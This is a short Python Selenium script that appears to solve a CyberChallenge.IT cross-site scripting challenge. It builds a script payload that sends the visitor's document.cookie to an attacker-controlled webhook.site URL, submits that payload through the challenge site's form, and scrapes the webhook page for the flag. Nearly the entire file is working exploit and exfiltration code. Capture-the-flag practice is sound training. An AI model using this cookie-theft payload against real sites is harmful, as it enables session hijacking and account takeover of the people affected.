from selenium import webdriver
from selenium.webdriver.common.by import By
import urllib.parse
from pyvirtualdisplay import Display
import time

display = Display(visible=0, size=(800, 600))
display.start()
webook_monitor = 'https://webhook.site'
webhook_driver = webdriver.Chrome()
webhook_driver.get(webook_monitor)
webhook = webhook_driver.current_url.replace('#!/', '')

url = 'http://xss1.challs.cyberchallenge.it/'
driver = webdriver.Chrome()
driver.get(url)

payload = f'<script>document.createElement("img").src="{webhook}/"+document.cookie;document.appendChild(img);</script>'
form = driver.find_element(By.XPATH, '//*[@id="navbarCollapse"]/form/input')
form.send_keys(url + '?html=' + urllib.parse.quote(payload, safe=''))
butt = driver.find_element(By.XPATH, '//*[@id="navbarCollapse"]/form/button')
butt.click()
driver.close()
time.sleep(3)
page = webhook_driver.page_source
flag = page[page.find('CCIT'):page.find('%7D') + 3]
flag = urllib.parse.unquote(flag)
print(flag)
